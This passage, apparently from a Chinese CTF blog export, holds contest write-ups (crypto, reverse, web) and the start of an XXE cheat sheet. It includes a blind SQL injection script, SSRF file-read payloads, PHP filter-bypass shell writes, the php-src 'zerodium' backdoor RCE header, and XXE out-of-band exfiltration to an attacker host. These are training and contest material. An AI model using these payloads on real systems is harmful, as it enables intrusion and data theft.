J(C)$ 都可以唯一表示为 $K[x]$ 上的一个多项式元组 $\\langle u(x),v(x) \\rangle$，多项式满足： $u(x)$ 是首一多项式 $u(x)$ 整除 $f(x)-h(x)v(x)-v^2(x)$ $\\deg(v(x)) \\lt \\deg(u(x)) \\lt g$ 这里 $h(x)=0,f(x)=x+x^7$，RNG部分生成三个随机数 $e_1,e_2,e_3$ 以及三个元素 $D_1,D_2,D_3 \\in J(C)$， RNG部分计算 $\\langle u(x),v(x) \\rangle=e_1D_1+e_2D_2+e_3D_3$ 并将系数转换为字节。 结合已知的a*20+flag共24字节，可以恢复 $u(x)$。 对于 $v(x)$，根据 $D \\in J(C)$ 的性质，有 $f(x)-h(x)v(x)-v^2(x) \\equiv 0 \\pmod {u(x)}$ 如果 $x_i$ 是 $u(x)$ 的根（$K$ 代数闭包下），有 $f(x_i)-h(x_i)v(x_i)-v^2(x_i) = 0 \\Longrightarrow v^2(x_i)+h(x_i)v(x_i)=f(x_i)$， 说明 $(x_i,v(x_i))$ 是 $C$ 上的一个点。 又 $h(x_i)=0$，则 $v^2(x_i)=f(x_i) \\Longrightarrow v(x_i) = \\pm \\sqrt{f(x_i)}$。 由于 $u(x)$ 次数为3，在$K$ 代数闭包下，可以找到三个根 $x_1,x_2,x_3$，即 $C$ 上的三个点 $(x_1,v(x_1)),(x_2,v(x_2)),(x_3,v(x_3))$，利用拉格朗日插值方法可以恢复 $v(x)$。 得到 $u(x)$ 和 $v(x)$，异或操作还原明文。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import structfrom itertools import product, cyclep = 10000000000000001119K = GF(p)R.&lt;x&gt; = K[]y = xf = y + y^7C = HyperellipticCurve(f, 0)J = C.jacobian()def get_u_from_out(output, known_input): res = [] for i in range(24): res.append(output[i]^^known_input[i]) res = bytes(res) u0, u1, u2 = struct.unpack(&quot;&lt;QQQ&quot;, res) u = x^3+x^2*u2+x*u1+u0 return udef get_v_from_u(u): Kbar = GF(p^6) Rbar.&lt;t&gt; = Kbar[&quot;t&quot;] u2 = u.change_ring(Rbar) roots = [x[0] for x in u2.roots()] ys = [] for root in roots: ys.append(f(root).sqrt(0,1)) res = [] for perm in product(range(2), repeat=3): poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) for i in range(3)]) if poly[0] in K: res.append(R(poly)) return resdef try_decode(output, u, v): rs = [u[0], u[1], u[2], v[0], v[1], v[2]] otp = struct.pack(&quot;&lt;QQQQQQ&quot;, *rs) decrypted = [a^^b for (a, b) in zip(output, cycle(otp)) ] return bytes(decrypted)output = bytes.fromhex(&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;)known_input = b&#x27;a&#x27; * 20 + b&#x27;flag&#x27;u = get_u_from_out(output, known_input)vs = get_v_from_u(u)for v in vs: #print((u,v)) print(try_decode(output,u,v)) #结果#b&#x27;aaaaaaaaaaaaaaaaaaaaflag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag|\\xb1J\\xedFp^v2\\xb9\\x10\\x16\\xf6\\xfddD(h7\\xb6\\xc3S\\xe0\\xcf-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\\xe3J\\xad\\x88\\xb2\\xac\\xf8\\x1c-C\\x07\\x97\\x02/B47l\\xd0\\xf30\\x8f&amp;\\xbf-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\\xe4\\xca\\xf5\\xbd\\xc6\\xa6\\x00B\\xfe\\xde\\xe3z\\x9a\\xbe\\x95D\\xf9\\xc2\\xafD\\xda\\xff\\xa3\\xeb-97d120aae6fc&#125;&#x27; flag值：flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc} ​ Webfind_it主页面没什么有用信息，扫描发现robots.txt，访问提示： 123When I was a child,I also like to read Robots.txtHere is what you want:1ndexx.php 访问1ndexx.php报500 Internal Server Error，尝试看是否存在vim源码泄露，发现访问.1ndexx.php.swp能回显源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; 代码逻辑： 将flag.php文件内容读入变量$I_know_you_wanna_but_i_will_not_give_you_hhh，并将传入的code参数值与变量$I_know_you_wanna_but_i_will_not_give_you_hhh一起写入hack.php文件中。 对code参数值过滤的关键字不少： system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|~|^|`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump 用命令执行、文件读写等多种方式尝试向hack.php写入php代码，以显示flag.php文件内容，发现show_source()函数可行。 payload: ?code=&lt;?=show_source(&quot;fla&quot;.&quot;g.php&quot;); 最后访问hack.php，得到flag.php内容： 123456789&lt;?php #ini_set(&#x27;display_errors&#x27;,true);#error_reporting(E_ALL ^ E_NOTICE);flag=MZWGCZ33HA3GIOJWHA2DGLJYGNTDCLJUGE3DSLJZMQZDILJZGY3TIZRTHE3GMMJQGN6Q====;echo &quot;What is important for a new bird of php??&quot;?&gt; Base32解码得flag。 flag值：flag{86d96843-83f1-4169-9d24-9674f396f103} ​ WebsiteManager 最新的网站测试器，作为非站长的你，能利用好它的功能吗？ 查看网页源码发现image.php?id=1，猜测存在sql注入，手工测试发现过滤了空格和双引号，且测试?id=-2/**/or/**/1=1有图片显示，?id=-2/**/or/**/1=2无图片显示，验证存在注入点，采用布尔盲注跑出登录用户名和密码： 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl = &quot;http://eci-2zefme7yqvztnp4652um.cloudeci1.ichunqiu.com/image.php&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;&#x27;&#x27; # payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27; payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(username,password))from(ctf.users)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27; data = &#123; &#x27;id&#x27;: f&quot;-2/**/or/**/&#123;payload&#125;&quot; &#125; r = requests.get(url,params=data) if &quot;HRN&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) #结果#库名: ctf#表名: images,users#users表中列名： username,password#users表中值： admin,9ebab83595888e5a8bd57 用admin和9ebab83595888e5a8bd57直接登录，结合curl.php猜测是SSRF，填入http://127.0.0.1/得到访问结果回显验证猜测，尝试改用file伪协议直接读取根目录flag文件得到flag。 payload: file://127.0.0.1/flag 或 file:///flag flag值：flag{f0d06b4c-954e-4a76-ad5d-95bd0227daea}","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"WebAssembly","slug":"reverse-WebAssembly","date":"2021-04-03T15:30:16.000Z","updated":"2024-03-14T16:58:08.820Z","comments":true,"path":"2021/04/03/reverse-WebAssembly/","permalink":"https://lazzzaro.github.io/2021/04/03/reverse-WebAssembly/","excerpt":"","text":"​ WebAssembly（wasm）是基于堆栈的虚拟机的二进制指令格式。wasm被设计为可编程C / C ++ / Rust等高级语言的可移植目标，可在Web上部署客户端和服务器应用程序。 wabt是用于WebAssembly的一套工具，包括： wat2wasm：从WebAssembly文本格式转换为 WebAssembly二进制格式wasm2wat： wat2wasm的逆函数，从二进制格式转换回文本格式（也称为.wat）wasm-objdump：显示有关wasm二进制文件的信息。与objdump类似。wasm-interp：使用基于堆栈的解释器解码并运行WebAssembly二进制文件wasm-decompile：将wasm二进制文件反编译为可读的类似C的语法。wat- desugar：解析规范解释程序支持的.wat文本格式（S表达式，平面语法或混合格式）并打印“规范”平面格式wasm2c：将WebAssembly二进制文件转换为C源代码和标头wasm-strip：删除WebAssembly二进制文件的部分wasm-validate：验证WebAssembly二进制格式的文件wast2json：将wasm spec测试格式的文件转换为JSON文件和关联的wasm二进制文件wasm-opcodecnt：计算指令的操作码使用量spectest-interp：读取Spectest JSON文件，然后在解释器中运行其测试 ​ 静态分析JEB反编译wabthttps://github.com/WebAssembly/wabt 123456789101112git config --global url.&quot;https://gitclone.com/&quot;.insteadOf https://git clone --recursive https://github.com/WebAssembly/wabtcd wabtgit submodule update --initmkdir buildcd buildcmake ..cmake --build ../wasm2wat wasm.wasm -o wasm.wat （反汇编）./wasm2c wasm.wasm -o wasm.c （反编译，末尾字符串）gcc -c wasm.c -o wasm.o （优化,编译时需要wabt/wasm2c目录中的wasm-rt.h、wasm-rt-impl.c、wasm-rt-impl.h三个文件） 123apt install wabtwasm-decompile wasm.wasm 注入代码通过注入代码的方式，来查看内存对应的字符。插入 run() 函数后。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647wasm = i.instance.exports;memories = [wasm.memory]viewDWORD = (addr) =&gt;&#123; const arr = new Uint32Array(memories[0].buffer.slice(addr, addr + 16)); return arr;&#125;;viewChar = (addr, size = 16) =&gt;&#123; const arr = new Uint8Array(memories[0].buffer.slice(addr, addr + size)); return String.fromCharCode.apply(null, arr);&#125;;viewHEX = (addr, size = 16) =&gt;&#123; const arr = new Uint8Array(memories[0].buffer.slice(addr, addr + size)); return (Array.from(arr, x =&gt;x.toString(16).padStart(2, &#x27;0&#x27;)).join(&#x27; &#x27;));&#125;;viewHexCode = (addr, size = 16) =&gt;&#123; const arr = new Uint8Array(memories[0].buffer.slice(addr, addr + size)); return (Array.from(arr, x =&gt;&#x27;0x&#x27; + x.toString(16).padStart(2, &#x27;0&#x27;)).join(&#x27;, &#x27;));&#125;;dumpMemory = (addr, size = 16) =&gt;&#123; const arr = new Uint8Array(memories[0].buffer.slice(addr, addr + size)); return arr;&#125;;viewString = (addr, size = 16) =&gt;&#123; const arr = new Uint8Array(memories[0].buffer.slice(addr, addr + size)); let max = size; for (let i = 0; i &lt; size; i++) &#123; if (arr[i] === 0) &#123; max = i; break; &#125; &#125; return String.fromCharCode.apply(null, arr.slice(0, max));&#125;;search = function(stirng) &#123; const m = new Uint8Array(memories[0].buffer); const k = Array.from(stirng, x =&gt;x.charCodeAt()); const match = (j) =&gt;&#123; return k.every((b, i) =&gt;m[i + j] === b); &#125;; const max = Math.min(10_000_000, m.byteLength || m.length); for (let i = 0; i &lt; max; i++) &#123; if (match(i)) &#123; console.info(i); &#125; &#125; console.info(&#x27;done&#x27;);&#125; 调用： viewChar($var1.value,16) ​ 动态调试 在对应文件夹开⼀个简易服务器，使用python创建⼀个简易的本地局域网：python -m http.server -b localhost，之后便可以直接用浏览器访问： http://localhost:8000/wasm.html 跟进调试，F12打开调试器，打开wasm文件 ctrl+f 查找main函数，点击地址栏下好断点，然后刷新，可以看见被断下 F8执行（等价于IDA的F9），F10单步步过，F11单步步入，然后跟进，直到要求我们输⼊flag 查看内存的方法：作用域-模块，点击memory右上角的图标 参考： wasm逆向——（极客大挑战2021wasm","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"WebAssembly","slug":"WebAssembly","permalink":"https://lazzzaro.github.io/tags/WebAssembly/"},{"name":"wasm","slug":"wasm","permalink":"https://lazzzaro.github.io/tags/wasm/"}],"author":"Lazzaro"},{"title":"2021数字中国创新大赛虎符网络安全赛道","slug":"match-2021数字中国创新大赛虎符网络安全赛道","date":"2021-04-03T12:31:00.000Z","updated":"2021-10-16T16:22:07.999Z","comments":true,"path":"2021/04/03/match-2021数字中国创新大赛虎符网络安全赛道/","permalink":"https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/","excerpt":"","text":"​ 数字中国是十九大提出的新时代国家信息化发展的新战略。2021数字中国创新大赛，作为数字中国建设峰会“一会、一展、一赛”的重要组成部分， 将继续采取多赛道并行的竞赛形式，设置数字党建、数字政府、大数据、智慧医疗、鲲鹏计算、网络安全、集成电路设计、青少年AI机器人八个赛道，紧贴数字中国建设峰会主题，围绕核心前沿技术与信息技术应用创新设置赛题，以多维度立体化的角度诠释“数字中国”。 第二届“虎符网络安全赛道“将在去年首次将PK体系与传统网络安全竞赛相结合的优势基础上，继续保持Wintel+PK双体系并行模式进行比赛，以“PK体系”在网络安全赛事中的创新升级应用作为赛事的核心驱动。同时在此基础上进行包括赛事场景、评委阵容以及选手权益在内的三大升级。 https://www.ichunqiu.com/2021hfctf ​ rank: 80+ Misc你会日志分析吗 线索只有一份access.log，你能从中分析到什么？ 明显能看出access.log日志文件中包含SQL时间盲注的记录，直接拉到最后看 ?id=1&#39;%20and%20if(ord(substr((select%20flag%20from%20flllag),xx,1))=xx,sleep(2),1)语句， 逐个字符猜解，正确情形会延迟2s，观察每行前一列的时间秒数，不连续的部分前一个字符即为正确字符。 懒写脚本，逐个手撸得到一串十进制数 90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61， 转为字符为base64编码字符串ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==，解码即为flag。 flag flag&#123;You_are_so_great&#125; ​ Cryptocubic Please give me 6 pairs of positive integers (x,y,z) satisfying the equation x/(y+z) + y/(z+x) + z/(x+y) = 6 给出著名不定方程 $\\cfrac{x}{y+z}+\\cfrac{y}{x+z}+\\cfrac{z}{x+y}=6$ 的6组正整数解，乍看容易实则不然。 方程在整数范围内易通过爆破求得多解，而正整数范围内很难用初等代数人工求得多解，需结合抽象代数解决。 背景参考：史上最贱的数学题 把 $x,y,z$ 看为 $a,b,c$，展开化简为： $a^3+b^3+c^3-5(a^2b+ab^2+a^2c+ac^2+b^2c+bc^2)-9abc=0$ 结合引用论文 An unusual cubic representation problem，将方程映射到二维空间，即 $(a,b,c) \\rightarrow (x,y)$。 $(a,b,c) \\rightarrow (x,y)$ 映射关系式： $\\begin{cases} x=\\cfrac{-4(a+b+2c)(N+3)}{(2a+2b-c)+(a+b)N}=\\cfrac{-36(a+b+2c)}{8a+8b-c} \\\\ y=\\cfrac{4(a-b)(N+3)(2N+5)}{(2a+2b-c)+(a+b)N}=\\cfrac{612(a-b)}{8a+8b-c} \\end{cases}$ 取 $(a,b,c)=(1,-1,0)$，得到椭圆曲线的Weierstrass形式方程： $E_6:y^2=x^3+(4N^2+12N-3)x^2+32(N+3)x=x^3+213x^2+288x$ 在曲线上易取出基点 $G$ 作为初始点，根据不定方程的 $(ka,kb,kc)$ 通解特性，可分别将基点 $G$ 数乘得到 $2G,3G,\\cdots$，再分别通过关系式映射回 $(a,b,c)$，以条件判断 $a&gt;0,b&gt;0,c&gt;0$，得到的 $(a,b,c)$ 即为不定方程的正整数解。 $(x,y) \\rightarrow (a,b,c)$ 映射关系式： $\\begin{cases} \\cfrac{a}{a+b+c}=\\cfrac{8(N+3)-x+y}{2(4-x)(N+3)} \\\\ \\cfrac{b}{a+b+c}=\\cfrac{8(N+3)-x-y}{2(4-x)(N+3)} \\\\ \\cfrac{c}{a+b+c}=\\cfrac{-4(N+3)-(N+2)x}{(4-x)(N+3)} \\end{cases}$ 脚本： 12345678910111213141516171819202122232425262728293031323334#Sageee = EllipticCurve([0, 4*6^2+12*6-3, 0, 32*(6+3), 0])print(ee)print(ee.gens())P = ee(-200,680) def orig(P,N): x = P[0] y = P[1] a = (8*(N+3)-x+y)/(2*(N+3)*(4-x)) b = (8*(N+3)-x-y)/(2*(N+3)*(4-x)) c = (-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da = denominator(a) db = denominator(b) dc = denominator(c) l = lcm(da,lcm(db,dc)) return [a*l, b*l, c*l]ans = []for k in range(200): u = orig(k*P, 6) (a,b,c) = (u[0],u[1],u[2]) if a&gt;0 and b&gt;0 and c&gt;0: print(k) print(a) print(b) print(c) print(a/(b+c)+b/(a+c)+c/(a+b)) print() ans.append((a,b,c)) print(ans)#len(ans)=8 再通过pwntools与环境交互得flag。 12345678910111213from pwn import *r = remote(&#x27;8.140.152.226&#x27;,27359)my = [...]r.recvline()for i in range(6): r.recvline() r.sendlineafter(&#x27;[&gt;] x: &#x27;,str(my[i][0])) r.sendlineafter(&#x27;[&gt;] y: &#x27;,str(my[i][1])) r.sendlineafter(&#x27;[&gt;] z: &#x27;,str(my[i][2])) print(r.recvline())print(r.recvall()) flag flag&#123;1f88de74-b6af-4b2b-abd5-46356151698b&#125; ​ Reverseredemption_code 所谓的虐心手游，连发的兑换码都这么复杂。 反编译看main()函数，输入字符串key分别经过两次处理： 第一层处理，pre()函数： 先判断输入key长度len(key)==14，再与字符串ss1=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;共同作为server_check_redemption_code()函数参数： server_check_redemption_code()函数的核心部分，通过编写代码测试，功能为返回key中符合字符串ss子串的最大长度，s数组保存逐行判断得到的连续字符状态值，如整个key为ss子串，返回起始下标值k-len(key)+1，否则返回-1。 第二层处理，判断输入key长度len(key)==14，再与字符串ss2=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;共同作为server_check_redemption_code()函数参数。 第一次check，需返回值不等于-1进到第二次check，第二次check需返回值为7输出flag，即key既是ss1子串，又是ss2从下标7开始的子串，即共有子串Ninja Must Die。 flag flag&#123;Ninja Must Die&#125; ​ Web签到 师傅们常说，要善于学习，细致入微；师傅们也常说，要善于分享，总结归纳。 hint: 2021年3月28日，PHP维护的官方Git服务器 git.php.net 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。 开始在环境里翻了一圈无头绪，放hint后查找此事件才知道这是几天前的事，紧跟时事的出题人。 来龙去脉： 3月28日，攻击者使用PHP的作者Rasmus Lerdorf和Jetbrains开发者Nikita Popov的账号，向git.php.net服务器上的 php-src 存储库推送了两次恶意提交。 经观察，在两个恶意提交中，攻击者在上游发布了一个假装成修正文字输入错误的神秘修改。 攻击者以Rasmus Lerdorf的身份签署的恶意提交（非法）植入远程代码执行后门。 仔细检查一下新增的第370行调用zend_eval_string函数的地方，可以发现，这段代码实际上是为运行被劫持的PHP版本的网站植入了一个后门，以获得轻松的远程代码执行（RCE）。 PHP的开发者表示，如果字符串以zerodium开头，这一行就会从User-Agentt HTTP头内执行PHP代码。 此外，恶意代码中包含了一条注解 “REMOVETHIS: sold to zerodium, mid 2017”。值得注意的是，Zerodium是一家知名的零日漏洞经纪商，而注释的意思是“漏洞在2017年中出售给了zerodium”。对此，Zerodium的CEO Chaouki Bekrar认为攻击者很可能试图出售这个漏洞，但找不到卖家，所以攻击者干脆自己恶搞。 同时参考Linkedin上的一文：Official PHP Git server attacked，照样构造payload，开始没注意到属性是User-Agentt而不是默认的User-Agent，百试不出… payload（加在HTTP头） 列目录：User-Agentt: zerodiumsystem(&#39;ls /&#39;); 读文件：User-Agentt: zerodiumsystem(&#39;cat /flag&#39;); flag flag&#123;cc5dbc99-fd75-41f8-87f6-825c7e08f016&#125;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"红明谷杯数据安全大赛技能场景赛","slug":"match-红明谷杯数据安全大赛技能场景赛","date":"2021-04-02T14:23:48.000Z","updated":"2021-04-02T15:07:15.488Z","comments":true,"path":"2021/04/02/match-红明谷杯数据安全大赛技能场景赛/","permalink":"https://lazzzaro.github.io/2021/04/02/match-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%8A%80%E8%83%BD%E5%9C%BA%E6%99%AF%E8%B5%9B/","excerpt":"","text":"​ 位于福建省中西部的三明市是一座有着优良革命血脉及红色精神的土地，作为曾经的中央苏区的核心区、中央红军长征的出发地、红旗不倒的革命根据地、伟人革命的重要实践地，这片红土地在数字化的今天，在打击网络犯罪，维护数字空间秩序方面同样褒有红色的先进性。结合数字中国峰会，开创网络安全赛事红色品牌——“红明谷”杯，将“风展红旗如画”延伸至网络安全领域，与全国各界网络精英一同打造网络空间的红色安全保卫基地。 本届大赛将创新通过安全意识赛、技能场景赛、揭榜挑战赛等多种竞赛模式，综合考察社会公众、党政机关、行业单位、科研院校等社会各界的网络安全理论及实践应用水平，促进网络实战，建立红色防线，解决实际问题，立体化提升参赛各方网络空间数字治理能力。 https://www.ichunqiu.com/hmgctf ​ 报了名，因工作日没怎么参加，下午抽空做了两题。 Rank: 80+ Misc签到 一起来参与数据安全知识小竞赛。 答题拿flag。 ​ 歪比歪比 戴夫发送了一些信息给僵尸，但是被我截获到了。看看能从里边发现什么?好像是一个Surprise，你来翻译翻译? 流量包里套着哈夫曼编码题，根据词频解码01串。 正要解出，到时间了。 ​ CryptoezCRT Chinese Remainder Theorem is fantastic 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import *import gmpy2from random import shuffleflag = b&quot;flag is here&quot;def shuffle_flag(s): str_list = list(s) shuffle(str_list) return &#x27;&#x27;.join(str_list)nl = []el = []count = 0while count != 5: p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = gmpy2.next_prime(bytes_to_long(flag)) e = gmpy2.invert(d, phi) nl.append(n) el.append(int(e)) count += 1print(nl)print(el)cl = []flag = shuffle_flag(flag.decode()).encode()for i in range(len(nl)): cl.append(pow(bytes_to_long(flag), el[i], nl[i]))print(cl) 五组 $n,e$，共私钥 $d$，用LLL算法打。发现 $n$ 都已帮从小到大排好序，一步到位。 由于 d = gmpy2.next_prime(bytes_to_long(flag))，求出 $d$ 后往回遍历拿到flag。 123456789101112131415161718192021#Sagefrom gmpy2 import *n = e = c = M=iroot(int(n[4]),int(2))[0]a = [0]*6a[0] = [M,e[0],e[1],e[2],e[3],e[4]]a[1] = [0,-n[0],0,0,0,0]a[2] = [0,0,-n[1],0,0,0]a[3] = [0,0,0,-n[2],0,0]a[4] = [0,0,0,0,-n[3],0]a[5] = [0,0,0,0,0,-n[4]]Mat = matrix(ZZ,a)Mat_LLL = Mat.LLL()d = abs(Mat_LLL[0][0]) // Mfor k in range(1500): print(bytes.fromhex(hex(d-k)[2:])) ​ Webwrite_shell 万无一失的waf。 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123; // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123; die(&#x27;hacker!!!&#x27;); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123; case &#x27;pwd&#x27;: echo $dir; break; case &#x27;upload&#x27;: $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt; 简单RCE。 先用 ?action=pwd 得到所在目录，再用 ?action=upload&amp;data=xxx 写PHP代码。 waf()函数过滤了php 和 空格，用短标签和 %09 即可绕过。 ?action=upload&amp;data=&lt;?=`ls%09/`?&gt; 读根目录，发现文件 !whatyouwantggggggg401.php， ?action=upload&amp;data=&lt;?=`tac%09/!whatyou*`?&gt; 读文件，访问sandbox目录查看源码得到flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"XXE","slug":"web-XXE","date":"2021-03-01T10:27:23.000Z","updated":"2025-04-24T12:45:46.730Z","comments":true,"path":"2021/03/01/web-XXE/","permalink":"https://lazzzaro.github.io/2021/03/01/web-XXE/","excerpt":"","text":"​ XML是一种非常流行的标记语言，用于配置文件。在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 XXE（XML External Entity，外部实体），从安全角度理解成 XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。 ​ 基本格式（外部实体）1234567891011121314&lt;!-- 通用实体 --&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;&lt;!-- 参数实体 --&gt;&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; %an-element; %remote-dtd; ​ 注入有回显 常规 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; 文件含特殊字符（参数实体） 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; evil.dtd 12&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt; ​ 无回显 (Blind OOB XXE) 常规 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt; 支持的协议： PHP: file http ftp php compress.zlib compress.bzip2 data glob phar Java: http https ftp file jar netdoc mailto gopher ​ 其他利用 HTTP内网主机探测 利用 file 协议读取作为支点服务器的网络配置文件，看有没有内网，以及网段大概是什么样子，可以尝试读取 